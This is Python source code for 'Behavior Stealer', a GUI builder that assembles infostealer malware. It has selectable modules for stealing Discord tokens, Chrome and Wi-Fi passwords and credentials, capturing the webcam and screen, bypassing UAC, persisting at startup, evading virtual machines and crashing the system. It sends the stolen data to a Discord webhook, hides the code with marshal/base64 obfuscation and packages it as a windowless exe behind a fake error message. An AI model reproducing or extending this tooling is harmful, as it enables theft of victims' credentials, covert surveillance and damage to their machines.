import threading
import customtkinter as ctk
from tkinter import filedialog, messagebox
import os
from PIL import Image
import requests
import subprocess
import webbrowser
import marshal
import base64

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class FakeErrorWindow(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.title("Behavior | Fake Error")
        self.geometry("400x300")
        self.configure(bg="#1e1e1e")
        try:
            self.iconbitmap("ICO/fakeerror.ico")
        except:
            pass
        self.resizable(False, False)
        self.attributes('-topmost', True)

        self.error_title_label = ctk.CTkLabel(self, text="Error Title:", text_color="#ffffff")
        self.error_title_label.pack(pady=(20, 5))
        self.error_title_entry = ctk.CTkEntry(self, width=300, fg_color="#3a3a3a", text_color="#ffffff")
        self.error_title_entry.pack(pady=5)

        self.error_message_label = ctk.CTkLabel(self, text="Error Message:", text_color="#ffffff")
        self.error_message_label.pack(pady=(20, 5))
        self.error_message_entry = ctk.CTkEntry(self, width=300, fg_color="#3a3a3a", text_color="#ffffff")
        self.error_message_entry.pack(pady=5)

        self.save_button = ctk.CTkButton(self, text="Save", command=self.save_config, fg_color="#3a3a3a", hover_color="#4a4a4a")
        self.save_button.pack(pady=20)

    def save_config(self):
        self.parent.error_title = self.error_title_entry.get()
        self.parent.error_message = self.error_message_entry.get()
        self.destroy()

class BehaviorBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Behavior Stealer | Menu")
        self.geometry("1200x600")
        self.configure(bg="#1e1e1e")
        self.resizable(False, False)
        try:
            self.iconbitmap("ICO/behavior.ico")
        except:
            pass

        self.building = False
        self.icon_path = None

        sidebar_width = 200
        self.sidebar = ctk.CTkFrame(self, width=sidebar_width, fg_color="#2c2c2c")
        self.sidebar.pack(side="left", fill="y")

        self.title_label = ctk.CTkLabel(
            self,
            text=" Behavior Stealer",
            font=("Orbitron", 42, "bold"),
            text_color="white",
        )
        self.title_label.place(x=450, y=10)
        self.obfuscation: bool = False

        try:
            self.behavior_image = ctk.CTkImage(Image.open("PNG/logo.png"), size=(150, 150))
            self.behavior_image_label = ctk.CTkLabel(self.sidebar, image=self.behavior_image, text="")
            self.behavior_image_label.pack(pady=(20, 10))
        except:
            pass

        try:
            self.icon_builder = ctk.CTkImage(Image.open("PNG/builder.png").resize((30, 30)))
        except:
            self.icon_builder = None
        try:
            self.icon_doc = ctk.CTkImage(Image.open("PNG/doc.png").resize((30, 30)))
        except:
            self.icon_doc = None
        try:
            self.icon_discord = ctk.CTkImage(Image.open("PNG/discord.png").resize((30, 30)))
        except:
            self.icon_discord = None

        button_width = sidebar_width - 40
        button_height = 100

        self.builder_button = ctk.CTkButton(
            self.sidebar,
            text="Home",
            font=("Impact", 24),
            image=self.icon_builder,
            compound="left",
            fg_color="#2c2c2c",
            hover_color="#3a3a3a",
            height=button_height,
            width=button_width,
            text_color="#ffffff",
            corner_radius=0,
            command=self.show_builder
        )
        self.builder_button.pack(
            pady=(10, 10),
            padx=10,
            fill="x"
        )

        self.doc_button = ctk.CTkButton(
            self.sidebar,
            text="Docu",
            font=("Impact", 24),
            image=self.icon_doc,
            compound="left",
            fg_color="#2c2c2c",
            hover_color="#3a3a3a",
            height=button_height,
            width=button_width,
            text_color="#ffffff",
            corner_radius=0,
            command=self.show_doc
        )
        self.doc_button.pack(
            pady=(0, 10),
            padx=10,
            fill="x"
        )

        self.discord_button = ctk.CTkButton(
            self.sidebar,
            text="Discord",
            font=("Impact", 24),
            image=self.icon_discord,
            compound="left",
            fg_color="#2c2c2c",
            hover_color="#3a3a3a",
            height=button_height,
            width=button_width,
            text_color="#ffffff",
            corner_radius=0,
            command=self.open_discord
        )
        self.discord_button.pack(
            pady=(0, 10),
            padx=10,
            fill="x"
        )

        self.author_label = ctk.CTkLabel(
            self.sidebar,
            text="By Kazam",
            text_color="#888888",
            font=("Orbitron", 18)
        )
        self.author_label.pack(side="bottom", pady=30, fill="x")
        self.author_label.configure(anchor="center")

        self.main_frame = ctk.CTkFrame(self, fg_color="#1e1e1e")
        self.main_frame.place(x=210, y=90, relwidth=0.8, relheight=0.8)

        self.module_vars = {
            "Auto Destruction": ctk.BooleanVar(),
            "Clipboard": ctk.BooleanVar(),
            "Discord Token": ctk.BooleanVar(),
            "Anti VM": ctk.BooleanVar(),
            "Kill Discord Client": ctk.BooleanVar(),
            "IP Info": ctk.BooleanVar(),
            "SystemInfo": ctk.BooleanVar(),
            "UAC Bypass": ctk.BooleanVar(),
            "Ip Config": ctk.BooleanVar(),
            "Serials Numbers": ctk.BooleanVar(),
            "HWID & UUID": ctk.BooleanVar(),
            "Discord Info": ctk.BooleanVar(),
            "BSOD": ctk.BooleanVar(),
            "Screen": ctk.BooleanVar(),
            "Webcam": ctk.BooleanVar(),
            "Add to Startup": ctk.BooleanVar(),
            "Discord Injection": ctk.BooleanVar(),
            "Fake Error": ctk.BooleanVar(),
            "Disconnect Session": ctk.BooleanVar(),
            "Kill All Programs": ctk.BooleanVar(),
            "Wifi Passwords": ctk.BooleanVar(),
            "Chrome Passwords": ctk.BooleanVar(),
            "Credentials": ctk.BooleanVar(),
            "Games": ctk.BooleanVar(),
            "Ping": ctk.BooleanVar()
        }
        self.ping_option = ctk.StringVar(value="here")

        self.show_builder()

    def open_discord(self):
        webbrowser.open("https://discord.gg/kDzzn7Vkdh")

    def clear_main_frame(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()

    def show_builder(self):
        self.clear_main_frame()
        self.title_label.configure(text="Behavior Stealer")

        self.builder_button.configure(fg_color="#3a3a3a", hover_color="#3a3a3a")
        self.doc_button.configure(fg_color="#2c2c2c", hover_color="#3a3a3a")
        self.discord_button.configure(fg_color="#2c2c2c", hover_color="#3a3a3a")

        column = 0
        row = 0
        max_columns = 5

        for label, var in self.module_vars.items():
            chk = ctk.CTkCheckBox(
                self.main_frame,
                text=label,
                variable=var,
                text_color="#ffffff",
                fg_color="#3a3a3a",
                hover_color="#4a4a4a",
                corner_radius=0,
                width=25,
                height=25,
                command=lambda l=label: self.on_module_select(l)
            )
            chk.grid(row=row, column=column, padx=20, pady=10, sticky="w")
            column += 1
            if column >= max_columns:
                column = 0
                row += 1

        separator = ctk.CTkFrame(self.main_frame, height=2, fg_color="#5a5a5a")
        separator.place(y=250, relwidth=0.95, relx=0.025)

        self.webhook_label = ctk.CTkLabel(
            self.main_frame,
            text="Webhook URL:",
            text_color="#ffffff"
        )
        self.webhook_label.place(x=40, y=300)

        self.webhook_entry = ctk.CTkEntry(
            self.main_frame,
            placeholder_text="Webhook URL",
            width=300,
            fg_color="#3a3a3a",
            text_color="#ffffff",
            border_color="#4a4a4a",
            corner_radius=10
        )
        self.webhook_entry.place(x=40, y=330)

        self.filetype = ctk.StringVar(value=".py")
        opt_menu = ctk.CTkOptionMenu(
            self.main_frame,
            values=[".py", ".exe"],
            variable=self.filetype,
            width=100,
            fg_color="#3a3a3a",
            button_color="#4a4a4a",
            button_hover_color="#4a4a4a",
            dropdown_hover_color="#4a4a4a",
            text_color="#ffffff",
            command=self.on_filetype_change
        )
        opt_menu.place(x=350, y=300)

        self.icon_button = ctk.CTkButton(
            self.main_frame,
            text="Select Icon",
            fg_color="#3a3a3a",
            hover_color="#4a4a4a",
            width=100,
            height=40,
            text_color="#ffffff",
            corner_radius=10,
            command=self.select_icon,
            state="disabled"
        )
        self.icon_button.place(x=350, y=350)

        self.ping_option_menu = ctk.CTkOptionMenu(
            self.main_frame,
            values=["here", "everyone"],
            variable=self.ping_option,
            width=100,
            fg_color="#3a3a3a",
            button_color="#4a4a4a",
            button_hover_color="#4a4a4a",
            dropdown_hover_color="#4a4a4a",
            text_color="#ffffff",
            state="disabled"
        )
        self.ping_option_menu.place(x=470, y=300)

        self.build_button = ctk.CTkButton(
            self.main_frame,
            text="Build",
            fg_color="#3a3a3a",
            hover_color="#4a4a4a",
            width=150,
            height=40,
            text_color="#ffffff",
            corner_radius=10,
            command=self.build_payload
        )
        self.build_button.place(x=470, y=350)

        self.test_button = ctk.CTkButton(
            self.main_frame,
            text="Test Webhook",
            fg_color="#3a3a3a",
            hover_color="#4a4a4a",
            width=150,
            height=40,
            text_color="#ffffff",
            corner_radius=10,
            command=self.test_webhook
        )
        self.test_button.place(x=600, y=300)

        self.test_label = ctk.CTkLabel(
            self.main_frame,
            text="",
            font=("Arial", 14, "bold"),
            text_color="#ffffff"
        )
        self.test_label.place(x=40, y=400)

    def show_doc(self):
        self.clear_main_frame()
        self.builder_button.configure(fg_color="#2c2c2c", hover_color="#3a3a3a")
        self.doc_button.configure(fg_color="#3a3a3a", hover_color="#3a3a3a")
        self.discord_button.configure(fg_color="#2c2c2c", hover_color="#3a3a3a")

        doc_path = "extra/doc.txt"
        if os.path.exists(doc_path):
            with open(doc_path, "r", encoding="utf-8") as file:
                doc_content = file.read()
        else:
            doc_content = "Documentation file not found."

        textbox = ctk.CTkTextbox(
            self.main_frame,
            width=800,
            height=550,
            fg_color="#3a3a3a",
            text_color="#ffffff",
            font=("Arial", 13),
            corner_radius=10
        )
        textbox.insert("0.0", doc_content)
        textbox.configure(state="disabled")
        textbox.pack(padx=20, pady=20)

    def on_filetype_change(self, choice):
        if choice == ".exe":
            self.icon_button.configure(state="normal")
        else:
            self.icon_button.configure(state="disabled")

    def select_icon(self):
        file_path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon Files", "*.ico"), ("All Files", "*.*")]
        )
        if file_path:
            self.icon_path = file_path
            self.icon_button.configure(text="Icon Selected")

    def on_module_select(self, label):
        if label == "Fake Error" and self.module_vars[label].get():
            self.open_fake_error_window()
        elif label == "Ping":
            if self.module_vars[label].get():
                self.ping_option_menu.configure(state="normal")
            else:
                self.ping_option_menu.configure(state="disabled")

    def open_fake_error_window(self):
        self.fake_error_window = FakeErrorWindow(self)

    def build_payload(self):
        if messagebox.askyesno("Script obfuscation", "Do you want to obfuscate the script ?"):
            self.obfuscation = True

        self.building = True
        self.animate_build_button(True)
        threading.Thread(target=self._build_payload_logic, daemon=True).start()

    def _build_payload_logic(self):
        def obfuscate(imports: list[str], fp: str) -> tuple[int, bytes | None]:
            try:
                with open(fp, "r", encoding='utf-8') as script:
                    content = script.read()

                compiledScript = compile(content, os.path.basename(fp), "exec")
                marshalScript  = marshal.dumps(compiledScript)
                base64Script   = base64.b64encode(marshalScript)

                obfScript = f"""{";".join(imports)};exec(marshal.loads(base64.b64decode({base64Script})))"""
                return (0, obfScript)
            except Exception as e:
                print(e)
                return (1, None)
            
        selected_modules = [name for name, var in self.module_vars.items() if var.get()]
        webhook_url = self.webhook_entry.get()
        filetype = self.filetype.get()

        if not webhook_url:
            self.after(0, lambda: messagebox.showerror("Error", "Please enter a webhook URL."))
            self.building = False
            self.after(0, self.animate_build_button, False)
            return

        save_path = filedialog.asksaveasfilename(
            defaultextension=filetype,
            filetypes=[("Python files", "*.py"), ("Executable files", "*.exe")]
        )
        if not save_path:
            self.building = False
            self.after(0, self.animate_build_button, False)
            return

        py_path = save_path
        if filetype == ".exe" and not save_path.endswith(".exe"):
            py_path = save_path.rsplit(".", 1)[0] + ".py"
        elif filetype == ".exe":
            py_path = save_path[:-4] + ".py"

        with open(py_path, "w", encoding="utf-8") as f:
            f.write(f'Behavior = "{webhook_url}"\n')
            ping_option = self.ping_option.get()
            f.write(f'ping = "{ping_option}"\n\n')

            module_map = {
                "Discord Info": ("PROGRAMS/discordinfo.py", ["import os", "import re", "import requests"]),
                "Discord Token": ("PROGRAMS/token.py", ["import os", "import re", "import requests"]),
                "Anti VM": ("PROGRAMS/antivm.py", ["import uuid", "from tkinter import messagebox", "import os", "import socket", "import subprocess", "import psutil"]),
                "Kill Discord Client": ("PROGRAMS/killdsc.py", ["import os", "import shutil", "import subprocess"]),
                "IP Info": ("PROGRAMS/ipinfo.py", ["import requests"]),
                "SystemInfo": ("PROGRAMS/system.py", "import platform", "import requests"),
                "Auto Destruction": ("PROGRAMS/autodestruct.py", ["import os"]),
                "UAC Bypass": ("PROGRAMS/uacbypass.py", ["import os", "import winreg", "import sys", "import subprocess"]),
                "Ip Config": ("PROGRAMS/ipconfig.py", ["import requests", "import subprocess"]),
                "Serials Numbers": ("PROGRAMS/serials.py", ["import requests", "import subprocess"]),
                "HWID & UUID": ("PROGRAMS/hwiduuid.py", ["import uuid", "import subprocess", "import requests", "json"]),
                "BSOD": ("PROGRAMS/bsod.py", ["import ctypes", "import sys"]),
                "Screen": ("PROGRAMS/screen.py", ["import requests", "import pyautogui", "from PIL import ImageGrab", "import tempfile", "import os", "import base64"]),
                "Webcam": ("PROGRAMS/webcam.py", ["import cv2", "import requests", "import os", "import tempfile", "import json"]),
                "Clipboard": ("PROGRAMS/clipboard.py", ["import requests", "import subprocess", "import requests"]),
                "Add to Startup": ("PROGRAMS/startup.py", ["import os", "import sys", "import winreg"]),
                "Discord Injection": ("PROGRAMS/injection.py", ["import os", "import shutil", "import glob"]),
                "Fake Error": ("PROGRAMS/fakeerror.py", ["import tkinter as tk", "from tkinter import messagebox"]),
                "Disconnect Session": ("PROGRAMS/disconnect.py", ["import os", "import platform", "import sys", "import subprocess"]),
                "Kill All Programs":( "PROGRAMS/killall.py", ["import os", "import platform", "import subprocess", "import sys"]),
                "Wifi Passwords": ("PROGRAMS/wifi.py", ["import requests", "import os", "import json", "import subprocess"]),
                "Chrome Passwords": ("PROGRAMS/passwords.py", ["import os", "import win32crypt", "import base64", "import sqlite3", "import json", "from Cryptodome.Cipher import AES", "import shutil", "import requests"]),
                "Credentials": ("PROGRAMS/credentials.py", ["import requests", "import json", "import os", "import subprocess"]),
                "Games": ("PROGRAMS/games.py", ["import requests", "import os", "import json", "import winreg"]),
                "Ping": ("PROGRAMS/ping.py", ["import requests"]), 
            }

            imports = []

            for name in selected_modules:
                path, importlist = module_map.get(name)[0], module_map.get(name)[1]
                if path and os.path.exists(path):
                    if name == "Fake Error":
                        error_title = getattr(self, 'error_title', 'Error')
                        error_message = getattr(self, 'error_message', 'An error occurred.')
                        with open(path, "r", encoding="utf-8") as m:
                            content = m.read()
                            f.write(content + f'\nshow_fake_error("{error_title}", "{error_message}")\n\n')
                    elif name == "Ping":
                        with open(path, "r", encoding="utf-8") as m:
                            content = m.read()
                            f.write(content + f'\nping_option(ping)\n\n')
                    else:
                        with open(path, "r", encoding="utf-8") as m:
                            f.write(m.read() + "\n\n")
                    
                    imports += importlist
                else:
                    f.write(f'# Missing module: {name}\n\n')

        if self.obfuscation:
            imports = [imp for imp in imports if len(imp) > 3]
            imports.append("import marshal") if "import marshal" not in imports else ()
            imports.append("import base64") if "import base64" not in imports else ()
            returncode, result = obfuscate(sorted(set(imports)), py_path)

            if returncode == 0:
                with open(py_path, "w", encoding='utf-8') as obfFile:
                    obfFile.write(result)

            self.obfuscation = False

        if filetype == ".exe":
            self.after(0, lambda: self.test_label.configure(text="Compiling to .exe, please wait..."))
            self.update_idletasks()
            success = self.compile_with_pyinstaller(py_path, save_path)
            if success:
                self.after(0, lambda: self.test_label.configure(text="Build successful!"))
            else:
                self.after(0, lambda: self.test_label.configure(text="Build failed. See console."))

        self.building = False
        self.after(0, self.animate_build_button, False)

    def compile_with_pyinstaller(self, py_path, exe_path):
        import shutil
        exe_dir = os.path.dirname(exe_path)
        exe_name = os.path.basename(exe_path).replace(".exe", "")

        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            f"--distpath={exe_dir}",
            f"--name={exe_name}",
            py_path
        ]

        if self.icon_path:
            cmd.extend([f"--icon={self.icon_path}"])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            build_folder = os.path.join(os.getcwd(), "build")
            spec_file = exe_name + ".spec"
            if os.path.exists(build_folder):
                shutil.rmtree(build_folder)
            if os.path.exists(spec_file):
                os.remove(spec_file)
            os.remove(py_path)
            return True
        except subprocess.CalledProcessError as e:
            print("PyInstaller failed:", e.stderr)
            return False

    def test_webhook(self):
        url = self.webhook_entry.get()
        self.test_button.configure(fg_color="#3a3a3a")
        self.test_label.configure(text="", text_color="#ffffff")
        if not url:
            self.test_label.configure(text="Enter a webhook URL")
            return
        try:
            data = {"content": "Behavior can Work!"}
            response = requests.post(url, json=data)
            if response.status_code == 204:
                self.test_label.configure(text="Webhook OK!", text_color="green")
            else:
                self.test_label.configure(text="Webhook failed", text_color="red")
        except Exception as e:
            self.test_label.configure(text="Webhook error", text_color="red")

    def animate_build_button(self, start):
        if start:
            self.building = True
            self.build_button.configure(text="Building")
            self.update_button_text(1)
        else:
            self.building = False
            self.build_button.configure(text="Build")

    def update_button_text(self, count):
        if not self.building:
            return
        dots = "." * (count % 4)
        try:
            self.build_button.configure(text="Building" + dots)
        except:
            pass
        if self.building:
            self.after(500, self.update_button_text, count + 1)

if __name__ == "__main__":
    app = BehaviorBuilder()
    app.mainloop()
